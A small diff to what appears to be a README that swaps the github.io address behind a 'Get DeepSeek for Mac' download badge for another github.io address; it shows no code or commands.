@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://junimata-orex.github.io/.github/deepseek">  
+<a href="https://deepseek-macos.github.io/.github/deepseek">  
 <img src="https://img.shields.io/badge/🤖_Get_DeepSeek_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Get DeepSeek for Mac">  
 </a>  
 </div>  
